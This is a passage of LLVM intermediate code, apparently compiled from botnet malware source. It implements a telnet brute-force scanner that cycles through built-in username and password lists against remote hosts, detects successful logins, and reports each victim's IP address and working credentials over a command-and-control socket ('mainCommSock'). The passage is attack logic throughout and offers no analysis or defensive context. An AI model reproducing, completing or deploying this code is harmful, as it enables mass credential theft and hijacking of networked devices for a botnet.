  %236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %235
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %236, i32 0, i32 6
  %238 = load i32, i32* %237, align 4
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %246

240:                                              ; preds = %233
  %241 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %242 = load i32, i32* %2, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %243
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %244, i32 0, i32 6
  store i32 %241, i32* %245, align 4
  br label %246

246:                                              ; preds = %240, %233
  br label %247

247:                                              ; preds = %246
  store %struct.fd_set* %4, %struct.fd_set** %14, align 8
  store i32 0, i32* %13, align 4
  br label %248

248:                                              ; preds = %258, %247
  %249 = load i32, i32* %13, align 4
  %250 = zext i32 %249 to i64
  %251 = icmp ult i64 %250, 16
  br i1 %251, label %252, label %261

252:                                              ; preds = %248
  %253 = load %struct.fd_set*, %struct.fd_set** %14, align 8
  %254 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %253, i32 0, i32 0
  %255 = load i32, i32* %13, align 4
  %256 = zext i32 %255 to i64
  %257 = getelementptr inbounds [16 x i64], [16 x i64]* %254, i64 0, i64 %256
  store i64 0, i64* %257, align 8
  br label %258

258:                                              ; preds = %252
  %259 = load i32, i32* %13, align 4
  %260 = add i32 %259, 1
  store i32 %260, i32* %13, align 4
  br label %248, !llvm.loop !37

261:                                              ; preds = %248
  br label %262

262:                                              ; preds = %261
  br label %263

263:                                              ; preds = %262
  %264 = load i32, i32* %2, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %265
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %266, i32 0, i32 0
  %268 = load i32, i32* %267, align 16
  %269 = srem i32 %268, 64
  %270 = zext i32 %269 to i64
  %271 = shl i64 1, %270
  %272 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i32 0, i32 0
  %273 = load i32, i32* %2, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %274
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %275, i32 0, i32 0
  %277 = load i32, i32* %276, align 16
  %278 = sdiv i32 %277, 64
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds [16 x i64], [16 x i64]* %272, i64 0, i64 %279
  %281 = load i64, i64* %280, align 8
  %282 = or i64 %281, %271
  store i64 %282, i64* %280, align 8
  %283 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %283, align 8
  %284 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %284, align 8
  %285 = load i32, i32* %2, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %286
  %288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 16
  %290 = add nsw i32 %289, 1
  %291 = call i32 @select(i32 %290, %struct.fd_set* null, %struct.fd_set* %4, %struct.fd_set* null, %struct.timeval* %5)
  store i32 %291, i32* %3, align 4
  %292 = load i32, i32* %3, align 4
  %293 = icmp eq i32 %292, 1
  br i1 %293, label %294, label %351

294:                                              ; preds = %263
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %295 = load i32, i32* %2, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %296
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %297, i32 0, i32 0
  %299 = load i32, i32* %298, align 16
  %300 = bitcast i32* %7 to i8*
  %301 = call i32 @getsockopt(i32 %299, i32 1, i32 4, i8* %300, i32* %6) #12
  %302 = load i32, i32* %7, align 4
  %303 = icmp ne i32 %302, 0
  br i1 %303, label %304, label %319

304:                                              ; preds = %294
  %305 = load i32, i32* %2, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %306
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %307, i32 0, i32 0
  %309 = load i32, i32* %308, align 16
  %310 = call i32 @sclose(i32 %309)
  %311 = load i32, i32* %2, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 2
  store i8 0, i8* %314, align 8
  %315 = load i32, i32* %2, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %316
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %317, i32 0, i32 3
  store i8 1, i8* %318, align 1
  br label %350

319:                                              ; preds = %294
  %320 = load i32, i32* %2, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 16
  %325 = load i32, i32* %2, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %326
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %327, i32 0, i32 0
  %329 = load i32, i32* %328, align 16
  %330 = call i32 (i32, i32, ...) @fcntl(i32 %329, i32 3, i8* null)
  %331 = and i32 %330, -2049
  %332 = call i32 (i32, i32, ...) @fcntl(i32 %324, i32 4, i32 %331)
  %333 = load i32, i32* %2, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %334
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %335, i32 0, i32 6
  store i32 0, i32* %336, align 4
  %337 = load i32, i32* %2, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 7
  store i16 0, i16* %340, align 16
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 8
  %345 = load i8*, i8** %344, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %345, i8 0, i64 1024, i1 false)
  %346 = load i32, i32* %2, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %347
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %348, i32 0, i32 2
  store i8 2, i8* %349, align 8
  br label %1075

350:                                              ; preds = %304
  br label %370

351:                                              ; preds = %263
  %352 = load i32, i32* %3, align 4
  %353 = icmp eq i32 %352, -1
  br i1 %353, label %354, label %369

354:                                              ; preds = %351
  %355 = load i32, i32* %2, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %356
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %357, i32 0, i32 0
  %359 = load i32, i32* %358, align 16
  %360 = call i32 @sclose(i32 %359)
  %361 = load i32, i32* %2, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %362
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %363, i32 0, i32 2
  store i8 0, i8* %364, align 8
  %365 = load i32, i32* %2, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %366
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %367, i32 0, i32 3
  store i8 1, i8* %368, align 1
  br label %369

369:                                              ; preds = %354, %351
  br label %370

370:                                              ; preds = %369, %350
  %371 = load i32, i32* %2, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %372
  %374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %373, i32 0, i32 6
  %375 = load i32, i32* %374, align 4
  %376 = add i32 %375, 5
  %377 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %378 = icmp ult i32 %376, %377
  br i1 %378, label %379, label %394

379:                                              ; preds = %370
  %380 = load i32, i32* %2, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %381
  %383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %382, i32 0, i32 0
  %384 = load i32, i32* %383, align 16
  %385 = call i32 @sclose(i32 %384)
  %386 = load i32, i32* %2, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %387
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %388, i32 0, i32 2
  store i8 0, i8* %389, align 8
  %390 = load i32, i32* %2, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 3
  store i8 1, i8* %393, align 1
  br label %394

394:                                              ; preds = %379, %370
  br label %1074

395:                                              ; preds = %69
  %396 = load i32, i32* %2, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 6
  %400 = load i32, i32* %399, align 4
  %401 = icmp eq i32 %400, 0
  br i1 %401, label %402, label %408

402:                                              ; preds = %395
  %403 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %404 = load i32, i32* %2, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %405
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %406, i32 0, i32 6
  store i32 %403, i32* %407, align 4
  br label %408

408:                                              ; preds = %402, %395
  %409 = load i32, i32* %2, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %410
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %411, i32 0, i32 8
  %413 = load i8*, i8** %412, align 8
  %414 = call i32 @matchPrompt(i8* %413)
  %415 = icmp ne i32 %414, 0
  br i1 %415, label %416, label %421

416:                                              ; preds = %408
  %417 = load i32, i32* %2, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %418
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %419, i32 0, i32 2
  store i8 7, i8* %420, align 8
  br label %421

421:                                              ; preds = %416, %408
  %422 = load i32, i32* %2, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %423
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %424, i32 0, i32 0
  %426 = load i32, i32* %425, align 16
  %427 = load i32, i32* %2, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %428
  %430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %429, i32 0, i32 8
  %431 = load i8*, i8** %430, align 8
  %432 = load i32, i32* %2, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %433
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %434, i32 0, i32 7
  %436 = load i16, i16* %435, align 16
  %437 = zext i16 %436 to i32
  %438 = call i32 @readUntil(i32 %426, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %431, i32 1024, i32 %437)
  %439 = icmp ne i32 %438, 0
  br i1 %439, label %440, label %458

440:                                              ; preds = %421
  %441 = load i32, i32* %2, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 6
  store i32 0, i32* %444, align 4
  %445 = load i32, i32* %2, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %446
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %447, i32 0, i32 7
  store i16 0, i16* %448, align 16
  %449 = load i32, i32* %2, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %450
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %451, i32 0, i32 8
  %453 = load i8*, i8** %452, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %453, i8 0, i64 1024, i1 false)
  %454 = load i32, i32* %2, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %455
  %457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %456, i32 0, i32 2
  store i8 3, i8* %457, align 8
  br label %1075

458:                                              ; preds = %421
  %459 = load i32, i32* %2, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 8
  %463 = load i8*, i8** %462, align 8
  %464 = call i64 @strlen(i8* %463) #11
  %465 = trunc i64 %464 to i16
  %466 = load i32, i32* %2, align 4
  %467 = sext i32 %466 to i64
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %467
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %468, i32 0, i32 7
  store i16 %465, i16* %469, align 16
  br label %470

470:                                              ; preds = %458
  %471 = load i32, i32* %2, align 4
  %472 = sext i32 %471 to i64
  %473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %472
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %473, i32 0, i32 6
  %475 = load i32, i32* %474, align 4
  %476 = add i32 %475, 30
  %477 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %478 = icmp ult i32 %476, %477
  br i1 %478, label %479, label %494

479:                                              ; preds = %470
  %480 = load i32, i32* %2, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %481
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %482, i32 0, i32 0
  %484 = load i32, i32* %483, align 16
  %485 = call i32 @sclose(i32 %484)
  %486 = load i32, i32* %2, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 2
  store i8 0, i8* %489, align 8
  %490 = load i32, i32* %2, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 3
  store i8 1, i8* %493, align 1
  br label %494

494:                                              ; preds = %479, %470
  br label %1074

495:                                              ; preds = %69
  %496 = load i32, i32* %2, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 0
  %500 = load i32, i32* %499, align 16
  %501 = load i32, i32* %2, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 4
  %505 = load i8, i8* %504, align 2
  %506 = zext i8 %505 to i64
  %507 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %506
  %508 = load i8*, i8** %507, align 8
  %509 = load i32, i32* %2, align 4
  %510 = sext i32 %509 to i64
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %510
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %511, i32 0, i32 4
  %513 = load i8, i8* %512, align 2
  %514 = zext i8 %513 to i64
  %515 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %514
  %516 = load i8*, i8** %515, align 8
  %517 = call i64 @strlen(i8* %516) #11
  %518 = call i64 @send(i32 %500, i8* %508, i64 %517, i32 16384)
  %519 = icmp slt i64 %518, 0
  br i1 %519, label %520, label %535

520:                                              ; preds = %495
  %521 = load i32, i32* %2, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %522
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %523, i32 0, i32 0
  %525 = load i32, i32* %524, align 16
  %526 = call i32 @sclose(i32 %525)
  %527 = load i32, i32* %2, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %528
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %529, i32 0, i32 2
  store i8 0, i8* %530, align 8
  %531 = load i32, i32* %2, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %532
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %533, i32 0, i32 3
  store i8 1, i8* %534, align 1
  br label %1075

535:                                              ; preds = %495
  %536 = load i32, i32* %2, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %537
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %538, i32 0, i32 0
  %540 = load i32, i32* %539, align 16
  %541 = call i64 @send(i32 %540, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i64 2, i32 16384)
  %542 = icmp slt i64 %541, 0
  br i1 %542, label %543, label %558

543:                                              ; preds = %535
  %544 = load i32, i32* %2, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %545
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %546, i32 0, i32 0
  %548 = load i32, i32* %547, align 16
  %549 = call i32 @sclose(i32 %548)
  %550 = load i32, i32* %2, align 4
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %551
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %552, i32 0, i32 2
  store i8 0, i8* %553, align 8
  %554 = load i32, i32* %2, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 3
  store i8 1, i8* %557, align 1
  br label %1075

558:                                              ; preds = %535
  %559 = load i32, i32* %2, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %560
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %561, i32 0, i32 2
  store i8 4, i8* %562, align 8
  br label %1074

563:                                              ; preds = %69
  %564 = load i32, i32* %2, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 6
  %568 = load i32, i32* %567, align 4
  %569 = icmp eq i32 %568, 0
  br i1 %569, label %570, label %576

570:                                              ; preds = %563
  %571 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %572 = load i32, i32* %2, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 6
  store i32 %571, i32* %575, align 4
  br label %576

576:                                              ; preds = %570, %563
  %577 = load i32, i32* %2, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %578
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %579, i32 0, i32 0
  %581 = load i32, i32* %580, align 16
  %582 = load i32, i32* %2, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %583
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %584, i32 0, i32 8
  %586 = load i8*, i8** %585, align 8
  %587 = load i32, i32* %2, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %588
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %589, i32 0, i32 7
  %591 = load i16, i16* %590, align 16
  %592 = zext i16 %591 to i32
  %593 = call i32 @readUntil(i32 %581, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %586, i32 1024, i32 %592)
  %594 = icmp ne i32 %593, 0
  br i1 %594, label %595, label %653

595:                                              ; preds = %576
  %596 = load i32, i32* @mainCommSock, align 4
  %597 = load i32, i32* %2, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %598
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 1
  %601 = bitcast i32* %600 to %struct.in_addr*
  %602 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %601, i32 0, i32 0
  %603 = load i32, i32* %602, align 4
  %604 = call i8* @inet_ntoa(i32 %603) #12
  %605 = load i32, i32* %2, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %606
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %607, i32 0, i32 4
  %609 = load i8, i8* %608, align 2
  %610 = zext i8 %609 to i64
  %611 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %610
  %612 = load i8*, i8** %611, align 8
  %613 = load i32, i32* %2, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 5
  %617 = load i8, i8* %616, align 1
  %618 = zext i8 %617 to i64
  %619 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %618
  %620 = load i8*, i8** %619, align 8
  %621 = call i32 (i32, i8*, ...) @sockprintf(i32 %596, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.77, i64 0, i64 0), i8* %604, i8* %612, i8* %620)
  %622 = load i32, i32* %2, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %623
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %624, i32 0, i32 6
  store i32 0, i32* %625, align 4
  %626 = load i32, i32* %2, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 7
  store i16 0, i16* %629, align 16
  %630 = load i32, i32* %2, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %631
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %632, i32 0, i32 8
  %634 = load i8*, i8** %633, align 8
  %635 = call i8* @strstr(i8* %634, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i64 0, i64 0)) #11
  %636 = icmp ne i8* %635, null
  br i1 %636, label %637, label %642

637:                                              ; preds = %595
  %638 = load i32, i32* %2, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %639
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %640, i32 0, i32 2
  store i8 5, i8* %641, align 8
  br label %647

642:                                              ; preds = %595
  %643 = load i32, i32* %2, align 4
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 2
  store i8 7, i8* %646, align 8
  br label %647

647:                                              ; preds = %642, %637
  %648 = load i32, i32* %2, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 8
  %652 = load i8*, i8** %651, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %652, i8 0, i64 1024, i1 false)
  br label %1075

653:                                              ; preds = %576
  %654 = load i32, i32* %2, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %655
  %657 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %656, i32 0, i32 8
  %658 = load i8*, i8** %657, align 8
  %659 = call i8* @strstr(i8* %658, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0)) #11
  %660 = icmp ne i8* %659, null
  br i1 %660, label %661, label %676

661:                                              ; preds = %653
  %662 = load i32, i32* %2, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %663
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %664, i32 0, i32 0
  %666 = load i32, i32* %665, align 16
  %667 = call i32 @sclose(i32 %666)
  %668 = load i32, i32* %2, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %669
  %671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %670, i32 0, i32 2
  store i8 0, i8* %671, align 8
  %672 = load i32, i32* %2, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %673
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %674, i32 0, i32 3
  store i8 0, i8* %675, align 1
  br label %1075

676:                                              ; preds = %653
  %677 = load i32, i32* %2, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 8
  %681 = load i8*, i8** %680, align 8
  %682 = call i64 @strlen(i8* %681) #11
  %683 = trunc i64 %682 to i16
  %684 = load i32, i32* %2, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %685
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %686, i32 0, i32 7
  store i16 %683, i16* %687, align 16
  br label %688

688:                                              ; preds = %676
  %689 = load i32, i32* %2, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %690
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %691, i32 0, i32 6
  %693 = load i32, i32* %692, align 4
  %694 = add i32 %693, 8
  %695 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %696 = icmp ult i32 %694, %695
  br i1 %696, label %697, label %712

697:                                              ; preds = %688
  %698 = load i32, i32* %2, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %699
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %700, i32 0, i32 0
  %702 = load i32, i32* %701, align 16
  %703 = call i32 @sclose(i32 %702)
  %704 = load i32, i32* %2, align 4
  %705 = sext i32 %704 to i64
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 2
  store i8 0, i8* %707, align 8
  %708 = load i32, i32* %2, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 3
  store i8 1, i8* %711, align 1
  br label %712

712:                                              ; preds = %697, %688
  br label %1074

713:                                              ; preds = %69
  %714 = load i32, i32* %2, align 4
  %715 = sext i32 %714 to i64
